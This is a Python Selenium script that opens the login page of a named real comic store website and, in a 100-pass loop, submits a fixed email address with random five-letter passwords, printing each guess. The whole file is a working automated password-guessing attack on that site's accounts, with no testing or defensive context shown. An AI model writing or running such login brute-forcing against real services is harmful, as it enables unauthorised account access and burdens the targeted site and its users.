import time
import string
import random
PATH = "C:\Selenium\chromedriver.exe"
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome(PATH)
driver.get("https://comicstores.es/registro/autenticacion.php")
time.sleep(5)
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_id("email")
    usr.clear()
    usr.send_keys("disom31955@mxgsby.com")
    psw = driver.find_element_by_id("clave")
    str = ''.join(random.choice(letters) for i in range(5))
    psw.send_keys(str)
    print(str)
    clk = driver.find_element_by_xpath("/html/body/div[1]/div/div[1]/div/div[1]/form/div[3]/input")
    time.sleep(3)
    clk.click()
    time.sleep(5)